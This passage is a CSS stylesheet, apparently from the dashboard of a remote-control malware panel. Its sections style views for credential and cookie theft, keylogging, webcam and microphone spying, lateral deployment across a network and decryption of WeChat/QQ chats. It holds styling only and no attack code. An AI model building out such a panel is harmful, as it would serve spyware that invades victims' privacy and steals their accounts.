  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
}

.screen-header {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
}

.screen-controls {
  display: flex;
  gap: 6px;
}

.screen-select {
  padding: 2px 6px;
  background: rgba(255,255,255,0.05);
  border: 1px solid var(--border);
  border-radius: 4px;
  color: var(--t2);
  font-size: 10px;
  cursor: pointer;
}

.screen-viewer {
  background: #0b0e17;
  min-height: 200px;
  padding: 8px;
  text-align: center;
}

.screen-control-active {
  outline: 2px solid #3b82f6;
  border-radius: 6px;
}
.screen-img {
  display: block;
  width: 100%;
  height: auto;
  border-radius: 4px;
  image-rendering: auto;
}
.screen-img-control {
  cursor: crosshair;
}

.screen-placeholder {
  color: var(--t3);
  font-size: 12px;
}

/* ===== 内网扫描 & 横向部署 ===== */
.lateral-section {
  margin-top: 16px;
  background: var(--card-bg);
  backdrop-filter: blur(8px);
  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
}
.lateral-header {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
}
.lateral-info {
  padding: 8px 16px;
  display: flex;
  gap: 16px;
  flex-wrap: wrap;
}
.lateral-meta {
  font-size: 11px;
  color: var(--t3);
}
.lateral-table {
  padding: 0 16px 12px;
}
table.lateral-table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12px;
}
.lateral-table table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12px;
}
.lateral-table th {
  text-align: left;
  padding: 6px 8px;
  border-bottom: 1px solid var(--border);
  color: var(--t3);
  font-weight: 500;
  font-size: 11px;
}
.lateral-table td {
  padding: 6px 8px;
  border-bottom: 1px solid rgba(255,255,255,0.03);
  color: var(--t2);
}
.lateral-empty {
  padding: 16px;
  text-align: center;
  color: var(--t3);
  font-size: 12px;
}
.deploy-cell {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
}
.deploy-quick {
  background: rgba(16,185,129,0.15) !important;
  color: #10b981 !important;
  border-color: rgba(16,185,129,0.3) !important;
}
.deploy-host-status {
  font-size: 11px;
  white-space: nowrap;
}
.deploy-dialog {
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
}
.deploy-dialog-mask {
  position: absolute;
  inset: 0;
  background: var(--el-mask-color);
}
.deploy-dialog-body {
  position: relative;
  background: var(--card-bg-solid);
  border: 2px solid var(--input-border);
  border-radius: 12px;
  padding: 20px 24px;
  width: 380px;
  max-width: 90vw;
  box-shadow: 0 12px 40px rgba(0,0,0,0.3);
}
.deploy-dialog-body h3 {
  margin: 0 0 16px;
  font-size: 14px;
  color: var(--t1);
}
.deploy-form {
  display: grid;
  gap: 8px;
}
.deploy-form label {
  font-size: 13px;
  color: var(--t1);
  margin-top: 6px;
  font-weight: 600;
}
.deploy-form input,
.deploy-form select {
  padding: 8px 10px;
  background: var(--input-bg);
  border: 2px solid var(--input-border);
  border-radius: 6px;
  color: var(--t1);
  font-size: 13px;
  outline: none;
  transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
}
.deploy-form select option {
  background: var(--card-bg-solid);
  color: var(--t1);
}
.deploy-form input:focus,
.deploy-form select:focus {
  border-color: var(--c-blue);
  background: var(--input-bg-focus);
  box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
}
.deploy-result {
  margin-top: 12px;
  font-size: 12px;
}
.deploy-actions {
  margin-top: 16px;
  display: flex;
  gap: 8px;
  justify-content: flex-end;
}

/* ===== 凭证窃取 ===== */
.cred-method-select {
  padding: 2px 8px;
  background: var(--input-bg);
  border: 1.5px solid var(--input-border);
  border-radius: 4px;
  color: var(--t1);
  font-size: 11px;
  cursor: pointer;
  outline: none;
}
.cred-results { padding: 0 0 8px; }
.cred-source-tag {
  display: inline-block;
  padding: 1px 6px;
  border-radius: 3px;
  font-size: 10px;
  font-weight: 600;
  text-transform: uppercase;
}
.src-credman { background: rgba(59,130,246,0.15); color: #3b82f6; }
.src-wifi { background: rgba(16,185,129,0.15); color: #10b981; }
.src-chrome { background: rgba(251,191,36,0.15); color: #f59e0b; }
.src-edge { background: rgba(59,130,246,0.15); color: #60a5fa; }
.src-brave { background: rgba(251,146,60,0.15); color: #fb923c; }
.src-opera, .src-operagx { background: rgba(239,68,68,0.15); color: #ef4444; }
.src-vivaldi { background: rgba(239,68,68,0.15); color: #ef4444; }
.src-360se, .src-360ee { background: rgba(16,185,129,0.15); color: #10b981; }
.src-qq { background: rgba(59,130,246,0.15); color: #60a5fa; }
.src-yandex { background: rgba(251,191,36,0.15); color: #f59e0b; }
[class*="src-"][class*="-cookie"] { background: rgba(192,132,252,0.15); color: #a78bfa; }
[class*="src-"][class*="-diag"] { background: rgba(100,116,139,0.15); color: #94a3b8; font-style: italic; }
.src-error { background: rgba(239,68,68,0.15); color: #ef4444; }
.cred-target { max-width: 420px; word-break: break-all; }
.cred-password { font-family: monospace; display: flex; align-items: center; gap: 6px; }
.cred-binary-tag {
  display: inline-block;
  padding: 1px 5px;
  border-radius: 3px;
  font-size: 9px;
  background: rgba(139,92,246,0.15);
  color: #a78bfa;
}
.password-mask {
  cursor: pointer;
  color: var(--t3);
  user-select: none;
}
.password-mask:hover { color: var(--accent); }
.password-real { color: #f59e0b; word-break: break-all; cursor: pointer; }
.cookie-section { margin-top: 12px; border-top: 1px solid var(--b2); padding-top: 10px; }
.cookie-header { display: flex; align-items: center; gap: 8px; padding: 0 8px 8px; flex-wrap: wrap; }
.cookie-title { font-size: 14px; font-weight: 600; color: var(--t1); white-space: nowrap; }
.cookie-count { background: var(--accent); color: #fff; font-size: 11px; padding: 1px 7px; border-radius: 10px; margin-left: 4px; }
.cookie-search { flex: 1; min-width: 160px; padding: 4px 10px; border-radius: 6px; border: 1px solid var(--b2); background: var(--bg2); color: var(--t1); font-size: 12px; outline: none; }
.cookie-search:focus { border-color: var(--accent); }
.cookie-table-wrap { max-height: 320px; overflow-y: auto; }
.cookie-table { width: 100%; border-collapse: collapse; font-size: 12px; }
.cookie-table th { position: sticky; top: 0; background: var(--bg2); padding: 5px 8px; text-align: left; color: var(--t3); font-weight: 500; border-bottom: 1px solid var(--b2); }
.cookie-table td { padding: 4px 8px; border-bottom: 1px solid var(--b1); color: var(--t2); }
.cookie-table tr:hover td { background: rgba(99,102,241,0.05); }
.cookie-host { color: var(--accent); max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.cookie-name { color: #a78bfa; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.cookie-val { display: flex; align-items: center; gap: 4px; }
.cookie-val-text { color: var(--t3); max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: monospace; font-size: 11px; }
.cred-sam-info {
  padding: 8px 16px;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 11px;
  border-top: 1px solid var(--border);
}
.cred-sam-info strong { color: var(--t2); white-space: nowrap; }
.cred-sam-status {
  color: var(--t3);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  flex: 1;
}

/* ===== 麦克风监听 ===== */
.mic-viewer {
  padding: 12px 16px;
}
.mic-visualizer {
  background: #1a1a2e;
  border-radius: 8px;
  overflow: hidden;
  border: 1px solid var(--border);
}
.mic-canvas {
  width: 100%;
  height: 80px;
  display: block;
}
.mic-meta {
  margin-top: 8px;
  font-size: 11px;
  color: var(--t3);
}
.mic-audio-hidden {
  display: none;
}

/* ===== 文件管理器 ===== */
.file-path-bar {
  display: flex;
  gap: 6px;
  align-items: center;
  flex: 1;
  max-width: 500px;
}
.file-path-input {
  flex: 1;
  padding: 4px 10px;
  background: var(--input-bg);
  border: 1.5px solid var(--input-border);
  border-radius: 4px;
  color: var(--t1);
  font-size: 11px;
  font-family: 'Cascadia Code', 'SF Mono', monospace;
  outline: none;
}
.file-path-input:focus { border-color: var(--c-blue); box-shadow: 0 0 0 2px rgba(59,130,246,0.15); }
.file-current-path {
  padding: 6px 16px;
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 11px;
  color: var(--t3);
  border-bottom: 1px solid rgba(255,255,255,0.03);
}
.file-error {
  padding: 8px 16px;
  font-size: 11px;
  color: #ef4444;
}
.file-table { max-height: 400px; overflow-y: auto; }
.file-row { cursor: default; }
.file-row:hover { background: rgba(255,255,255,0.02); }
.file-icon { margin-right: 6px; }
.file-dir-name { color: #60a5fa; cursor: pointer; }
.file-dir-name:hover { text-decoration: underline; }
.file-type { font-size: 10px; color: var(--t3); }
.file-size { font-size: 11px; white-space: nowrap; }
.file-time { font-size: 10px; color: var(--t3); white-space: nowrap; }
.file-actions { white-space: nowrap; }
.file-too-large { font-size: 10px; color: var(--t3); }

/* ===== 摄像头监控 ===== */
.webcam-error {
  padding: 8px 16px;
  font-size: 11px;
  color: #ef4444;
}
.webcam-viewer {
  padding: 12px 16px;
  position: relative;
}
.webcam-viewer:fullscreen {
  background: #000;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 0;
}
.webcam-img {
  width: 100%;
  border-radius: 8px;
  border: 1px solid var(--border);
  cursor: pointer;
}
.webcam-img-fullscreen {
  width: auto;
  max-width: 100vw;
  max-height: 100vh;
  border-radius: 0;
  border: none;
  object-fit: contain;
}
.webcam-viewer:fullscreen .webcam-meta {
  position: absolute;
  bottom: 16px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.6);
  color: #fff;
  padding: 4px 16px;
  border-radius: 8px;
  font-size: 12px;
}
.webcam-meta {
  margin-top: 8px;
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 11px;
  color: var(--t3);
}

/* ===== 进程/服务/键盘记录 ===== */
.proc-filter-input {
  padding: 3px 8px;
  border: 1.5px solid var(--input-border);
  border-radius: 4px;
  background: var(--input-bg);
  color: var(--t1);
  font-size: 12px;
  width: 140px;
  outline: none;
}
.proc-filter-input:focus {
  border-color: var(--c-blue);
  box-shadow: 0 0 0 2px rgba(59,130,246,0.15);
}
.proc-table-wrap { max-height: 400px; overflow-y: auto; padding: 0 16px 12px; }
.proc-name { font-family: monospace; font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.ip-location { font-size: 11px; color: #f59e0b; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.proc-title { font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; opacity: 0.7; }
.svc-state { font-size: 11px; padding: 1px 5px; border-radius: 3px; }
.svc-state.running { background: rgba(5,150,105,0.15); color: #34d399; }
.svc-state.stopped { background: rgba(100,116,139,0.1); color: #94a3b8; }
.svc-actions { display: flex; gap: 4px; }
.qcmd-btn.danger { color: var(--btn-danger-color); border-color: var(--btn-danger-border); background: var(--btn-danger-bg); }
.keylog-status { font-size: 11px; padding: 2px 8px; border-radius: 10px; background: rgba(100,116,139,0.1); color: #94a3b8; }
.keylog-status.active { background: rgba(5,150,105,0.15); color: #34d399; animation: pulse-glow 2s infinite; }
@keyframes pulse-glow { 0%,100% { opacity: 1; } 50% { opacity: 0.6; } }
.keylog-output { padding: 12px; max-height: 400px; overflow-y: auto; }
.keylog-pre { font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; color: var(--t1); line-height: 1.6; margin: 0; }

/* ===== Windows 工具箱网格 ===== */
.win-toolkit-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}
.tk-half { grid-column: span 1; }
.tk-full { grid-column: 1 / -1; }
.tk-icon {
  font-style: normal;
  margin-right: 5px;
  font-size: 13px;
}
.tk-body {
  padding: 10px 16px;
}
.tk-empty {
  padding: 14px 16px;
  text-align: center;
  font-size: 11px;
  color: var(--t3);
  opacity: 0.7;
}
.tk-result-msg {
  margin-top: 6px;
  font-size: 11px;
  color: var(--accent);
  padding: 4px 0;
}
.rdp-row {
  display: flex;
  align-items: center;
  gap: 8px;
}
.rdp-label {
  font-size: 11px;
  color: var(--t3);
  white-space: nowrap;
}

/* ===== 注册表编辑器 ===== */
.reg-subkeys {
  padding: 6px 16px 8px;
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
}
.reg-subkey {
  display: inline-flex;
  align-items: center;
  padding: 3px 10px;
  border-radius: 4px;
  font-size: 11px;
  background: rgba(59,130,246,0.08);
  color: #60a5fa;
  cursor: pointer;
  transition: background 0.15s, transform 0.1s;
  border: 1px solid rgba(59,130,246,0.12);
}
.reg-subkey:hover { background: rgba(59,130,246,0.18); transform: translateY(-1px); }
.reg-write-bar {
  display: flex;
  gap: 6px;
  align-items: center;
  padding: 8px 16px;
  border-top: 1px solid var(--border);
}
.reg-input {
  padding: 5px 8px;
  background: var(--input-bg);
  border: 1.5px solid var(--input-border);
  border-radius: 4px;
  color: var(--t1);
  font-size: 11px;
  font-family: 'Cascadia Code', 'SF Mono', monospace;
  outline: none;
  flex: 1;
  transition: border-color 0.2s, box-shadow 0.2s;
}
.reg-input:focus { border-color: var(--c-blue); box-shadow: 0 0 0 2px rgba(59,130,246,0.15); }
.reg-checkbox {
  display: flex;
  align-items: center;
  gap: 4px;
  font-size: 11px;
  color: var(--t2);
  white-space: nowrap;
  cursor: pointer;
}

/* ===== 系统信息收集 ===== */
.info-dump-result { padding: 10px 16px; }
.info-dump-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
  gap: 4px 16px;
  margin-bottom: 8px;
}
.info-dump-item {
  display: flex;
  gap: 8px;
  font-size: 11px;
  padding: 4px 0;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}
.info-dump-key {
  color: var(--t3);
  min-width: 90px;
  font-weight: 600;
  text-transform: uppercase;
  font-size: 10px;
  letter-spacing: 0.3px;
}
.info-dump-val { color: var(--t1); word-break: break-all; }
.info-dump-sub {
  font-size: 11px;
  padding: 6px 0;
  border-top: 1px solid var(--border);
  color: var(--t2);
}
.info-dump-sub strong { color: var(--t1); margin-right: 6px; }

/* ===== 敏感文件标签 ===== */
.src-ssh_key { background: rgba(239,68,68,0.15); color: #ef4444; }
.src-config { background: rgba(251,191,36,0.15); color: #f59e0b; }
.src-credential { background: rgba(192,132,252,0.15); color: #a78bfa; }
.src-database { background: rgba(16,185,129,0.15); color: #10b981; }
.src-crypto { background: rgba(244,114,182,0.15); color: #f472b6; }
.src-document { background: rgba(59,130,246,0.15); color: #60a5fa; }

/* ===== 聊天记录 ===== */
.chat-summary {
  font-size: 11px;
  color: var(--t3);
  margin-left: 8px;
}
.chat-accounts {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  padding: 8px 16px;
  border-bottom: 1px solid var(--border);
}
.chat-account-tag {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 11px;
  padding: 4px 10px;
  border-radius: 6px;
  background: rgba(255,255,255,0.03);
  border: 1px solid var(--border);
}
.chat-acc-name { color: var(--t1); font-weight: 600; }
.chat-acc-detail { color: var(--t3); font-size: 10px; max-width: 280px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.chat-platform-badge {
  display: inline-block;
  padding: 1px 6px;
  border-radius: 3px;
  font-size: 10px;
  font-weight: 600;
  letter-spacing: 0.3px;
  flex-shrink: 0;
}
.plat-wechat { background: rgba(7,193,96,0.15); color: #07c160; }
.plat-qq { background: rgba(18,183,245,0.15); color: #12b7f5; }
.chat-container {
  display: flex;
  height: 420px;
  border-top: 1px solid var(--border);
}
.chat-conv-list {
  width: 240px;
  min-width: 200px;
  border-right: 1px solid var(--border);
  overflow-y: auto;
  flex-shrink: 0;
}
.chat-conv-item {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 10px 12px;
  cursor: pointer;
  border-bottom: 1px solid rgba(255,255,255,0.03);
  transition: background 0.15s;
}
.chat-conv-item:hover { background: rgba(255,255,255,0.04); }
.chat-conv-item.active { background: rgba(59,130,246,0.1); border-left: 2px solid var(--accent); }
.chat-conv-info { flex: 1; min-width: 0; }
.chat-conv-name {
  font-size: 12px;
  font-weight: 600;
  color: var(--t1);
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.chat-conv-preview {
  font-size: 10px;
  color: var(--t3);
  margin-top: 2px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.chat-conv-meta {
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  gap: 3px;
  flex-shrink: 0;
}
.chat-conv-time { font-size: 9px; color: var(--t3); }
.chat-conv-count {
  font-size: 9px;
  background: rgba(59,130,246,0.2);
  color: #60a5fa;
  padding: 0 5px;
  border-radius: 8px;
  font-weight: 600;
}
.chat-messages {
  flex: 1;
  display: flex;
  flex-direction: column;
  min-width: 0;
}
.chat-msg-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 14px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0;
}
.chat-msg-title { font-size: 13px; font-weight: 600; color: var(--t1); }
.chat-msg-count { font-size: 10px; color: var(--t3); }
.chat-msg-body {
  flex: 1;
  overflow-y: auto;
  padding: 12px 16px;
  display: flex;
  flex-direction: column;
  gap: 6px;
}
.chat-bubble-row {
  display: flex;
  flex-direction: column;
  max-width: 75%;
}
.chat-bubble-row.send { align-self: flex-end; align-items: flex-end; }
.chat-bubble-row.recv { align-self: flex-start; align-items: flex-start; }
.chat-bubble {
  padding: 7px 12px;
  border-radius: 12px;
  font-size: 12px;
  line-height: 1.5;
  word-break: break-word;
  max-width: 100%;
}
.chat-bubble.send {
  background: rgba(59,130,246,0.2);
  color: #93c5fd;
  border-bottom-right-radius: 4px;
}
.chat-bubble.recv {
  background: rgba(255,255,255,0.06);
  color: var(--t1);
  border-bottom-left-radius: 4px;
}
.chat-msg-type {
  display: inline-block;
  font-size: 9px;
  padding: 0 4px;
  border-radius: 3px;
  background: rgba(251,191,36,0.2);
  color: #fbbf24;
  margin-right: 4px;
  vertical-align: middle;
}
.chat-msg-text { vertical-align: middle; }
.chat-msg-time {
  font-size: 9px;
  color: var(--t3);
  margin-top: 2px;
  opacity: 0.7;
}
.chat-msg-empty {
  text-align: center;
  color: var(--t3);
  font-size: 12px;
  padding: 40px 0;
  opacity: 0.6;
}
.chat-status-bar {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 8px;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
}
.chat-decrypt-summary {
  font-size: 11px;
  color: var(--t2);
  margin-left: auto;
}
.chat-detail-toggle {
  font-size: 10px;
  padding: 2px 8px;
  border-radius: 4px;
  border: 1px solid var(--border);
  background: transparent;
  color: var(--t2);
  cursor: pointer;
}
.chat-detail-toggle:hover { background: rgba(255,255,255,0.05); }
.chat-details-panel {
  padding: 8px 16px;
  border-bottom: 1px solid var(--border);
  max-height: 200px;
  overflow-y: auto;
  background: rgba(0,0,0,0.1);
}
.chat-detail-row {
  display: flex;
  gap: 8px;
  align-items: center;
  padding: 3px 0;
  font-size: 11px;
}
.chat-detail-name {
  color: var(--t2);
  min-width: 120px;
}
.chat-detail-status {
  font-family: monospace;
  font-size: 10px;
  word-break: break-all;
}
.chat-detail-status.ok { color: #22c55e; }
.chat-detail-status.fail { color: #ef4444; }
.chat-error-list {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  padding: 8px 16px;
  border-bottom: 1px solid var(--border);
}
.chat-error-tag {
  font-size: 10px;
  padding: 2px 8px;
  border-radius: 4px;
  background: rgba(239,68,68,0.12);
  color: #ef4444;
}
.chat-db-list {
  display: flex;
  flex-wrap: wrap;
  gap: 4px;
  padding: 8px 16px;
  border-bottom: 1px solid var(--border);
}
.chat-db-tag {
  font-size: 10px;
  padding: 2px 8px;
  border-radius: 4px;
  border: 1px solid var(--border);
}
.chat-db-size {
  opacity: 0.6;
  margin-left: 4px;
}

/* ===== 移动端适配 ===== */
@media (max-width: 768px) {
  .server-detail { padding: 10px 12px; }
  .detail-header { flex-wrap: wrap; gap: 8px; margin-bottom: 12px; }
  .detail-title { font-size: 14px; }
  .uptime { margin-left: 0; flex-basis: 100%; font-size: 11px; }
  .info-grid { grid-template-columns: repeat(2, 1fr); gap: 6px; margin-bottom: 10px; }
  .info-item { padding: 8px 10px; }
  .info-value { font-size: 12px; }
  .metric-cards { grid-template-columns: 1fr; gap: 8px; margin-bottom: 10px; }
  .metric-chart { height: 120px; }
  .metric-big-num { height: 80px; .font-num { font-size: 24px; } }
  .history-section { padding: 10px; }
  .history-header { flex-direction: column; align-items: flex-start; gap: 8px; }
  .history-chart { height: 200px; }
  .terminal-header { padding: 8px 12px; gap: 8px; }
  .xterm-container { height: 300px; padding: 2px 0 2px 2px; }
  .term-btn { padding: 4px 10px; font-size: 10px; }
  .win-toolkit-grid { grid-template-columns: 1fr; }
  .tk-half { grid-column: span 1; }
  .reg-write-bar { flex-wrap: wrap; }
  .rdp-row { flex-wrap: wrap; }
  .chat-container { flex-direction: column; height: auto; max-height: 500px; }
  .chat-conv-list { width: 100%; min-width: 0; max-height: 150px; border-right: none; border-bottom: 1px solid var(--border); }
  .chat-messages { min-height: 250px; }
}

@media (max-width: 480px) {
  .server-detail { padding: 8px; }
  .info-grid { grid-template-columns: 1fr 1fr; gap: 4px; }
  .xterm-container { height: 260px; }
}
</style>

<style lang="scss">
/* ===== ServerDetail Light Theme (only non-variable overrides) ===== */
html.light .info-item,
html.light .metric-card,
html.light .history-section,
html.light .terminal-section {
  background: #fff !important;
  box-shadow: 0 1px 4px rgba(0,0,0,0.06) !important;
  border-color: #e2e8f0 !important;
}
html.light .term-status.connected { background: rgba(5,150,105,0.1); color: #059669; }
html.light .term-status.disconnected { background: rgba(100,116,139,0.08); color: #94a3b8; }
html.light .lateral-section {
  background: #fff !important;
  border: 1px solid #e2e8f0 !important;
  box-shadow: 0 1px 4px rgba(0,0,0,0.06) !important;
}
html.light .lateral-header { border-bottom: 1px solid #e2e8f0 !important; }
html.light .section-title { color: #1e293b !important; font-weight: 600 !important; }
html.light .lateral-empty { color: #94a3b8 !important; }
html.light .lateral-table th {
  color: #475569 !important;
  background: #f8fafc !important;
  border-bottom: 2px solid #e2e8f0 !important;
  font-weight: 600 !important;
}
html.light .lateral-table td { color: #334155 !important; border-bottom: 1px solid #f1f5f9 !important; }
html.light .lateral-table tbody tr:hover { background: #f8fafc !important; }
html.light .proc-name { color: #1e293b !important; }
html.light .proc-title { color: #64748b !important; opacity: 1 !important; }
html.light .svc-state.running { background: #dcfce7 !important; color: #16a34a !important; }
html.light .svc-state.stopped { background: #f1f5f9 !important; color: #64748b !important; }
html.light .keylog-status { background: #f1f5f9 !important; color: #64748b !important; }
html.light .keylog-status.active { background: #dcfce7 !important; color: #16a34a !important; }
html.light .keylog-output { background: #f8fafc !important; border-radius: 6px; }
html.light .file-current-path { color: #64748b !important; border-bottom-color: #f1f5f9 !important; }
html.light .file-row:hover { background: #f8fafc !important; }
html.light .password-real { color: #d97706 !important; }
html.light .chat-conv-item:hover { background: #f8fafc !important; }
html.light .chat-conv-item.active { background: rgba(59,130,246,0.08) !important; }
html.light .chat-bubble.recv { background: #f1f5f9 !important; color: #334155 !important; }
html.light .chat-bubble.send { background: rgba(59,130,246,0.12) !important; color: #1e40af !important; }
html.light .chat-account-tag { background: #f8fafc !important; border-color: #e2e8f0 !important; }
html.light .cred-sam-info { border-top-color: #e2e8f0 !important; }
html.light .cred-sam-info strong { color: #334155 !important; }
html.light .cred-sam-status { color: #64748b !important; }
html.light .scan-subnet { color: #334155 !important; }
</style>
